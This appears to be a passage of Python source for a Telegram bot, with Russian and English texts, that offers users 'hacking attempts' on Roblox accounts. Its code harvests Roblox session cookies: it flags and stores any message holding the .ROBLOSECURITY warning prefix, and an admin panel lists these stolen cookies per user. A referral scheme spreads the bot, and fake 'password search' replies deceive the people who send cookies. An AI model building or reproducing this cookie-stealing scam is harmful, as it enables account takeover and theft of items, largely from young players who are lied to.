from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import json
import os
from datetime import datetime

# ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
BOT_TOKEN = os.getenv("BOT_TOKEN")

# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА (ТОЛЬКО ТЫ ВИДИШЬ АДМИНСКИЕ КНОПКИ)
YOUR_USER_ID = 1341594703

# ⚠️ НАСТРОЙКИ ПОДПИСКИ
REQUIRED_CHANNEL = "@reviewsh1pe"
CHANNEL_ID = None

# ===================================================
# ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
# ===================================================

MESSAGES_FILE = "messages.json"
KEYWORD_USERS_FILE = "keyword_users.json"
ALL_USERS_FILE = "all_users.json"
ATTEMPTS_FILE = "attempts.json"
REFERRALS_FILE = "referrals.json"
LANGUAGE_FILE = "languages.json"

KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"

# ===================================================
# ПЕРЕВОДЫ
# ===================================================

TRANSLATIONS = {
    "ru": {
        # Выбор языка
        "choose_language": "🌐 **Выберите язык для использования бота:**\n\nВыберите язык, на котором вы хотите общаться с ботом.",
        "language_changed": "✅ Язык изменен на Русский!",
        "change_language": "🌐 Сменить язык",
        
        # Главное меню
        "bot_start": "Привет, {name}! 👋\n\n🎯 **У тебя {attempts} бесплатная попытка взлома**\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\nВыбери нужную категорию:",
        "back_to_menu": "◀️ Назад в меню",
        "device": "Взломать аккаунт",
        "cookies": "Инструкция",
        "referral": "👥 Пригласить друга",
        "buy_roblox": "💰 Купить Roblox",
        
        # Подписка
        "check_subscription": "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
        "not_subscribed": "❌ **Вы ещё не подписались на канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
        "subscribe_button": "📢 ПОДПИСАТЬСЯ НА КАНАЛ",
        "subscribed_button": "✅ Я ПОДПИСАЛСЯ",
        
        # Админские кнопки
        "all_users": "👥 Все пользователи",
        "keyword_users": "🔑 С ключевым словом",
        "stats": "📊 Статистика",
        "chat_user": "💬 Чат с пользователем",
        "give_attempts": "🎯 Выдать попытки",
        "mailing": "📨 Рассылка",
        "delete_users": "🗑 Удалить пользователей",
        "send_message_to_user": "✉️ Отправить сообщение пользователю",
        "message_sent_to_user": "✅ Сообщение отправлено пользователю!",
        "message_from_admin": "📩 Сообщение от администратора:",
        
        # Блок покупки Roblox
        "buy_roblox_title": "💎 **КУПИТЬ ROBLOX** 💎\n\n💰 Хотите приобрести Robux или любую вещь в Roblox?\n\n📩 **Свяжитесь с нами:**\n👤 @h1peoff\n\n⚡ Быстрое оформление\n💳 Безопасная оплата\n🎁 Лучшие цены\n\nНапишите нам прямо сейчас! 🚀",
        
        # Реферальная система
        "referral_text": "👥 **Пригласи друга и получи +1 попытку!**\n\n🎯 Твои попытки: {attempts}\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\n📎 **Твоя реферальная ссылка:**\n`{link}`\n\n📋 **Как это работает:**\n1. Отправь ссылку другу\n2. Друг переходит по ссылке и запускает бота\n3. Ты получаешь +1 попытку взлома\n\n⚠️ Важно: друг должен быть новым пользователем!",
        
        # Устройства
        "device_choice": "🎯 **У тебя {attempts} попытка взлома осталась**\n\nВыбери своё устройство:",
        "phone": "📱 Телефон",
        "computer": "💻 Компьютер",
        "phone_video": "📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
        "computer_video": "💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
        "cookies_instruction": "1. Зайти на профиль жертвы\n2. Скопировать cookie\n3. Вставить cookie в бота\n4. Скинуть ссылку 📌 cookie в бота\n5. Ожидать до получения пароля и логина",
        "no_attempts": "❌ **У тебя закончились попытки взлома!**\n\nЧтобы получить новую попытку, пригласи друга.\nЗа каждого друга ты получаешь +1 попытку! 🎁",
        "cookies_sent": "Скинь cookie в бота\nИ бот начнет поиск пароля вашей жертвы😈\nВ течении 12 часов бот скинет вам пароль от аккаунта",
        "cookies_copied": "Скопировал куки ✅",
        "back": "◀️ Вернуться",
        
        # Ответы на сообщения
        "keyword_received": "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n🎯 Осталось попыток: {remaining}\n\nНе создавайте повторных заявок, иначе будете заблокированы\nЕсли в течении 12 часов бот не ответил, значит он не нашел пароль от аккаунта",
        "message_received": "Ваше сообщение получено. Ожидайте результат.",
        "wrong_cookie": "Пожалуйста, отправьте правильный cookie для продолжения.",
        "delayed_message": "Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы.",
        
        # Админские сообщения
        "admin_stats": "📊 **СТАТИСТИКА БОТА:**\n\n👥 Всего пользователей: {total_users}\n🔑 С ключевым словом: {keyword_users}\n📩 Сообщений сохранено: {messages}\n📅 Новых сегодня: {today}",
        "no_users": "📭 Никто ещё не заходил в бота.",
        "no_keyword_users": "📭 Нет пользователей, отправивших ключевое слово.",
        "all_users_title": "👥 **ВСЕ ПОЛЬЗОВАТЕЛИ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
        "keyword_users_title": "🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
        "no_messages": "📭 У пользователя {name} (@{username}) пока нет сообщений.",
        "no_keyword_messages": "📭 У {name} (@{username}) нет сообщений с ключевым словом.",
        
        # Удаление
        "delete_users_menu": "🗑 **Управление пользователями:**\n\nВыберите действие:",
        "delete_single_user": "🗑 Удалить одного пользователя",
        "delete_all_users": "🗑 Удалить всех пользователей",
        "delete_confirm": "⚠️ **Подтверждение удаления:**\n\nВы уверены, что хотите удалить пользователя?\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\n🗑 Это действие нельзя отменить!",
        "delete_success": "✅ **Пользователь успешно удалён!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\nПользователь больше не в списке с ключевым словом.",
        "delete_all_confirm": "⚠️⚠️⚠️ **ВНИМАНИЕ!** ⚠️⚠️⚠️\n\nВы собираетесь удалить ВСЕХ пользователей из списка с ключевым словом!\n\n📊 Всего будет удалено: {count} пользователей\n\n🗑 Это действие НЕЛЬЗЯ отменить!\n\nПодтвердите удаление:",
        "delete_all_success": "✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n🗑 Удалено пользователей: {count}\n📭 Список с ключевым словом теперь пуст.",
        "yes_delete": "✅ Да, удалить",
        "cancel": "❌ Отмена",
        "confirm_delete_all": "⚠️ ДА, УДАЛИТЬ ВСЕХ",
        
        # Выдача попыток
        "give_attempts_menu": "🎯 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ВЫДАЧИ ПОПЫТОК:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
        "give_attempts_user": "🎯 **Выдача попыток пользователю:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Текущее количество попыток: {attempts}\n\nВыберите сколько попыток выдать:",
        "give_attempts_success": "✅ **Попытки успешно выданы!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Добавлено: {count} попыток\n🎯 Теперь попыток: {new_attempts}",
        "give_all_zero": "🎯 Выдать всем у кого 0",
        "give_all_zero_confirm": "⚠️ **ВНИМАНИЕ!**\n\nВы собираетесь выдать по 1 попытке всем пользователям у которых 0 попыток.\n\n👥 Таких пользователей: {count}\n\nПодтвердите действие:",
        "give_all_zero_success": "✅ **Попытки успешно выданы!**\n\n👥 Получили попытку: {success}\n❌ Ошибок: {failed}\n📊 Всего выдано: {total} попыток",
        "give_all_zero_no_users": "✅ У всех пользователей есть попытки!\nНикому не нужно выдавать.",
        "give_more": "◀️ Выдать еще",
        "enter_count": "📝 **Введите количество попыток для выдачи:**\n\nПросто отправьте число (например: 5)\nДля отмены нажмите /cancel",
        "invalid_number": "❌ Количество должно быть больше 0!",
        "enter_number": "❌ Пожалуйста, отправьте число!",
        "attempts_canceled": "❌ Выдача попыток отменена.",
        
        # Рассылка
        "mailing_menu": "📨 **Выберите кому отправить рассылку:**\n\n⚠️ Сообщение будет отправлено после того, как вы его напишете.",
        "mailing_all": "📨 Всем пользователям",
        "mailing_keyword": "🔑 Только с ключевым словом",
        "mailing_all_text": "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\nПросто отправьте сообщение в этот чат.\nДля отмены нажмите /cancel",
        "mailing_keyword_text": "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\nПросто отправьте сообщение в этот чат.\nДля отмены нажмите /cancel",
        "mailing_canceled": "❌ Рассылка отменена.",
        "mailing_no_users": "❌ Нет пользователей для рассылки.",
        "mailing_start": "⏳ Начинаю рассылку для {count} пользователей...",
        "mailing_success": "✅ **Рассылка завершена!**\n\n📤 Отправлено: {sent}\n❌ Не доставлено: {failed}\n👥 Всего: {total}",
        
        # Чат
        "chat_select_user": "💬 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
        "chat_title": "💬 **Чат с {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего сообщений: {total}\n\n",
        "chat_keyword_title": "🔑 **Cookie от {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего: {total} сообщений\n\n",
        "chat_full_title": "💬 **ВСЕ СООБЩЕНИЯ {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего: {total}\n\n",
        "keyword_only": "🔑 Только с ключевым словом",
        "show_all": "📋 Показать ВСЕ сообщения полностью",
        "show_more": "... и ещё {count} сообщений",
        "send_msg_to_user": "✉️ Отправить сообщение этому пользователю",
        
        # Кнопки навигации
        "prev": "◀️ Назад",
        "next": "Вперед ▶️",
    },
    "en": {
        # Выбор языка
        "choose_language": "🌐 **Choose your language:**\n\nSelect the language you want to use the bot in.",
        "language_changed": "✅ Language changed to English!",
        "change_language": "🌐 Change language",
        
        # Главное меню
        "bot_start": "Hello, {name}! 👋\n\n🎯 **You have {attempts} free hacking attempts**\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\nChoose a category:",
        "back_to_menu": "◀️ Back to menu",
        "device": "Hack account",
        "cookies": "Instructions",
        "referral": "👥 Invite a friend",
        "buy_roblox": "💰 Buy Roblox",
        
        # Подписка
        "check_subscription": "⚠️ **You must subscribe to our channel to use the bot!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
        "not_subscribed": "❌ **You haven't subscribed to the channel yet!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
        "subscribe_button": "📢 SUBSCRIBE TO CHANNEL",
        "subscribed_button": "✅ I SUBSCRIBED",
        
        # Админские кнопки
        "all_users": "👥 All users",
        "keyword_users": "🔑 With keyword",
        "stats": "📊 Statistics",
        "chat_user": "💬 Chat with user",
        "give_attempts": "🎯 Give attempts",
        "mailing": "📨 Mailing",
        "delete_users": "🗑 Delete users",
        "send_message_to_user": "✉️ Send message to user",
        "message_sent_to_user": "✅ Message sent to user!",
        "message_from_admin": "📩 Message from administrator:",
        
        "buy_roblox_title": "💎 **BUY ROBLOX** 💎\n\n💰 Want to buy Robux or any item in Roblox?\n\n📩 **Contact us:**\n👤 @h1peoff\n\n⚡ Fast processing\n💳 Secure payment\n🎁 Best prices\n\nContact us now! 🚀",
        
        "referral_text": "👥 **Invite a friend and get +1 attempt!**\n\n🎯 Your attempts: {attempts}\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\n📎 **Your referral link:**\n`{link}`\n\n📋 **How it works:**\n1. Send the link to a friend\n2. Friend clicks the link and starts the bot\n3. You get +1 hacking attempt\n\n⚠️ Important: friend must be a new user!",
        
        "device_choice": "🎯 **You have {attempts} hacking attempts left**\n\nChoose your device:",
        "phone": "📱 Phone",
        "computer": "💻 Computer",
        "phone_video": "📱 Watch the video completely and follow all instructions as shown, then everything will work.",
        "computer_video": "💻 Watch the video completely and follow all instructions as shown, then everything will work.",
        "cookies_instruction": "1. Go to the victim's profile\n2. Copy the cookie\n3. Paste the cookie into the bot\n4. Send the cookie 📌 to the bot\n5. Wait for the password and login",
        "no_attempts": "❌ **You've run out of hacking attempts!**\n\nTo get a new attempt, invite a friend.\nYou get +1 attempt for each friend! 🎁",
        "cookies_sent": "Send the cookie to the bot\nAnd the bot will start searching for your victim's password😈\nWithin 12 hours the bot will send you the account password",
        "cookies_copied": "Cookies copied ✅",
        "back": "◀️ Back",
        
        "keyword_received": "Great, our bot has started searching for your victim's password.\n🎯 Attempts left: {remaining}\n\nDon't create duplicate requests or you'll be blocked\nIf the bot doesn't respond within 12 hours, it means the password wasn't found",
        "message_received": "Your message has been received. Waiting for results.",
        "wrong_cookie": "Please send a valid cookie to continue.",
        "delayed_message": "Sorry, we couldn't find the password for your account. Don't create a duplicate request, try again in 7 days or you'll be blocked.",
        
        "admin_stats": "📊 **BOT STATISTICS:**\n\n👥 Total users: {total_users}\n🔑 With keyword: {keyword_users}\n📩 Messages saved: {messages}\n📅 New today: {today}",
        "no_users": "📭 No users have used the bot yet.",
        "no_keyword_users": "📭 No users have sent the keyword.",
        "all_users_title": "👥 **ALL USERS:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
        "keyword_users_title": "🔑 **USERS WITH KEYWORD:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
        "no_messages": "📭 User {name} (@{username}) has no messages yet.",
        "no_keyword_messages": "📭 {name} (@{username}) has no messages with keyword.",
        
        "delete_users_menu": "🗑 **User Management:**\n\nChoose an action:",
        "delete_single_user": "🗑 Delete one user",
        "delete_all_users": "🗑 Delete all users",
        "delete_confirm": "⚠️ **Delete confirmation:**\n\nAre you sure you want to delete this user?\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\n🗑 This action cannot be undone!",
        "delete_success": "✅ **User successfully deleted!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\nUser is no longer in the keyword list.",
        "delete_all_confirm": "⚠️⚠️⚠️ **WARNING!** ⚠️⚠️⚠️\n\nYou are about to delete ALL users from the keyword list!\n\n📊 Total to be deleted: {count} users\n\n🗑 This action CANNOT be undone!\n\nConfirm deletion:",
        "delete_all_success": "✅ **ALL USERS DELETED!**\n\n🗑 Users deleted: {count}\n📭 Keyword list is now empty.",
        "yes_delete": "✅ Yes, delete",
        "cancel": "❌ Cancel",
        "confirm_delete_all": "⚠️ YES, DELETE ALL",
        
        "give_attempts_menu": "🎯 **SELECT USER TO GIVE ATTEMPTS:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
        "give_attempts_user": "🎯 **Giving attempts to user:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Current attempts: {attempts}\n\nChoose how many attempts to give:",
        "give_attempts_success": "✅ **Attempts successfully given!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Added: {count} attempts\n🎯 Now has: {new_attempts} attempts",
        "give_all_zero": "🎯 Give to all with 0",
        "give_all_zero_confirm": "⚠️ **WARNING!**\n\nYou are about to give 1 attempt to all users who have 0 attempts.\n\n👥 Such users: {count}\n\nConfirm action:",
        "give_all_zero_success": "✅ **Attempts successfully given!**\n\n👥 Received attempts: {success}\n❌ Errors: {failed}\n📊 Total given: {total} attempts",
        "give_all_zero_no_users": "✅ All users have attempts!\nNo one needs to be given.",
        "give_more": "◀️ Give more",
        "enter_count": "📝 **Enter the number of attempts to give:**\n\nJust send a number (e.g., 5)\nTo cancel press /cancel",
        "invalid_number": "❌ The number must be greater than 0!",
        "enter_number": "❌ Please send a number!",
        "attempts_canceled": "❌ Attempts giving canceled.",
        
        "mailing_menu": "📨 **Select who to send the mailing to:**\n\n⚠️ The message will be sent after you write it.",
        "mailing_all": "📨 All users",
        "mailing_keyword": "🔑 Only with keyword",
        "mailing_all_text": "📨 **Write the mailing text for ALL users:**\n\nJust send a message in this chat.\nTo cancel press /cancel",
        "mailing_keyword_text": "📨 **Write the mailing text for users with keyword:**\n\nJust send a message in this chat.\nTo cancel press /cancel",
        "mailing_canceled": "❌ Mailing canceled.",
        "mailing_no_users": "❌ No users for mailing.",
        "mailing_start": "⏳ Starting mailing for {count} users...",
        "mailing_success": "✅ **Mailing completed!**\n\n📤 Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {total}",
        
        "chat_select_user": "💬 **SELECT USER:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
        "chat_title": "💬 **Chat with {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total messages: {total}\n\n",
        "chat_keyword_title": "🔑 **Cookies from {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total: {total} messages\n\n",
        "chat_full_title": "💬 **ALL MESSAGES {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total: {total}\n\n",
        "keyword_only": "🔑 Only with keyword",
        "show_all": "📋 Show ALL messages completely",
        "show_more": "... and {count} more messages",
        "send_msg_to_user": "✉️ Send message to this user",
        
        "prev": "◀️ Back",
        "next": "Next ▶️",
    }
}

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ЯЗЫКОМ
# ===================================================

def get_user_language(user_id):
    try:
        if os.path.exists(LANGUAGE_FILE):
            with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
                languages = json.load(f)
            return languages.get(str(user_id), "ru")
        return "ru"
    except:
        return "ru"

def set_user_language(user_id, language):
    try:
        if os.path.exists(LANGUAGE_FILE):
            with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
                languages = json.load(f)
        else:
            languages = {}
        
        languages[str(user_id)] = language
        
        with open(LANGUAGE_FILE, "w", encoding="utf-8") as f:
            json.dump(languages, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"Ошибка сохранения языка: {e}")
        return False

def get_text(user_id, key, **kwargs):
    lang = get_user_language(user_id)
    text = TRANSLATIONS.get(lang, TRANSLATIONS["ru"]).get(key, TRANSLATIONS["ru"].get(key, key))
    if kwargs:
        try:
            text = text.format(**kwargs)
        except:
            pass
    return text

# ===================================================
# ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ
# ===================================================

async def check_subscription(user_id, context):
    try:
        chat_member = await context.bot.get_chat_member(
            chat_id=REQUIRED_CHANNEL,
            user_id=user_id
        )
        return chat_member.status in ['creator', 'administrator', 'member']
    except Exception as e:
        print(f"Ошибка проверки подписки для {user_id}: {e}")
        return True

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ И РЕФЕРАЛАМИ
# ===================================================

def get_user_attempts(user_id):
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                attempts = json.load(f)
            return attempts.get(str(user_id), 1)
        return 1
    except:
        return 1

def set_user_attempts(user_id, attempts_count):
    try:
        if os.path.exists(ATTEMPTS_FILE):
            with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                attempts = json.load(f)
        else:
            attempts = {}
        
        attempts[str(user_id)] = attempts_count
        
        with open(ATTEMPTS_FILE, "w", encoding="utf-8") as f:
            json.dump(attempts, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"Ошибка сохранения попыток: {e}")
        return False

def add_attempts(user_id, count):
    current = get_user_attempts(user_id)
    set_user_attempts(user_id, current + count)
    return get_user_attempts(user_id)

def use_attempt(user_id):
    current = get_user_attempts(user_id)
    if current <= 0:
        return False
    
    set_user_attempts(user_id, current - 1)
    return True

def get_user_referrals(user_id):
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                referrals = json.load(f)
            return referrals.get(str(user_id), [])
        return []
    except:
        return []

def add_referral(user_id, referred_user_id):
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                referrals = json.load(f)
        else:
            referrals = {}
        
        user_id_str = str(user_id)
        referred_str = str(referred_user_id)
        
        if user_id_str not in referrals:
            referrals[user_id_str] = []
        
        if referred_str not in referrals[user_id_str]:
            referrals[user_id_str].append(referred_str)
            
            current_attempts = get_user_attempts(user_id)
            set_user_attempts(user_id, current_attempts + 1)
            
            with open(REFERRALS_FILE, "w", encoding="utf-8") as f:
                json.dump(referrals, f, ensure_ascii=False, indent=2)
            return True
        return False
    except Exception as e:
        print(f"Ошибка добавления реферала: {e}")
        return False

def get_referral_count(user_id):
    return len(get_user_referrals(user_id))

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
# ===================================================

def save_all_user(user_id, username, first_name, referrer_id=None):
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        user_id_str = str(user_id)
        
        if user_id_str in users:
            users[user_id_str]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            users[user_id_str] = {
                "username": username,
                "first_name": first_name,
                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "referrer": str(referrer_id) if referrer_id else None
            }
            
            if referrer_id:
                add_referral(referrer_id, user_id)
        
        with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")
        return False

def get_all_users():
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_keyword_user(user_id, username, first_name):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "username": username,
            "first_name": first_name,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def is_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            return str(user_id) in users
        return False
    except:
        return False

def get_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def delete_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            
            if str(user_id) in users:
                del users[str(user_id)]
                with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                    json.dump(users, f, ensure_ascii=False, indent=2)
                return True
        return False
    except Exception as e:
        print(f"Ошибка удаления пользователя: {e}")
        return False

def delete_all_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
                json.dump({}, f)
            return True
        return False
    except Exception as e:
        print(f"Ошибка удаления всех пользователей: {e}")
        return False

def get_user_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            user_msgs = [msg for msg in messages if str(msg.get("user_id")) == str(user_id)]
            user_msgs.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
            return user_msgs
        return []
    except:
        return []

def get_keyword_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id) and KEYWORD in msg.get("text", "")]
        return []
    except:
        return []

def save_message(user_id, username, first_name, text, timestamp):
    if not is_keyword_user(user_id):
        return
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
        else:
            messages = []
        
        messages.append({
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "text": text,
            "timestamp": timestamp
        })
        
        if len(messages) > 500:
            messages = messages[-500:]
        
        with open(MESSAGES_FILE, "w", encoding="utf-8") as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения сообщения: {e}")

# ===================================================
# ФУНКЦИИ ДЛЯ ПОСТРАНИЧНОГО ВЫВОДА
# ===================================================

async def show_users_page(query, context, page=0, per_page=10):
    user_id = query.from_user.id
    users = get_all_users()
    if not users:
        await query.edit_message_text(get_text(user_id, "no_users"))
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = get_text(user_id, "all_users_title", total=total_users, page=page+1, total_pages=total_pages)
    
    for user_id_str, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        first_seen = user_data.get("first_seen", "неизвестно")
        last_seen = user_data.get("last_seen", "неизвестно")
        has_keyword = "✅" if is_keyword_user(user_id_str) else "❌"
        attempts = get_user_attempts(user_id_str)
        
        text += f"🆔 {user_id_str}\n"
        text += f"👤 {name} (@{username})\n"
        text += f"📅 First seen: {first_seen}\n"
        text += f"🕐 Last seen: {last_seen}\n"
        text += f"🔑 Keyword: {has_keyword}\n"
        text += f"🎯 Attempts: {attempts}\n"
        text += "─" * 25 + "\n"
    
    keyboard = []
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if len(text) > 4096:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await query.message.reply_text(part)
        await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
    else:
        await query.edit_message_text(text, reply_markup=reply_markup)

async def show_keyword_users_page(query, context, page=0, per_page=10):
    user_id = query.from_user.id
    users = get_keyword_users()
    if not users:
        await query.edit_message_text(get_text(user_id, "no_keyword_users"))
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = get_text(user_id, "keyword_users_title", total=total_users, page=page+1, total_pages=total_pages)
    
    for user_id_str, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        timestamp = user_data.get("timestamp", "неизвестно")
        attempts = get_user_attempts(user_id_str)
        
        text += f"🆔 {user_id_str}\n"
        text += f"👤 {name} (@{username})\n"
        text += f"🕐 Sent: {timestamp}\n"
        text += f"🎯 Attempts: {attempts}\n"
        text += "─" * 25 + "\n"
    
    keyboard = []
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"keyword_users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"keyword_users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu")])
    keyboard.append([InlineKeyboardButton("📩 " + get_text(user_id, "cookies"), callback_data="view_keyword_messages")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "delete_single_user"), callback_data="delete_single_user")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")])
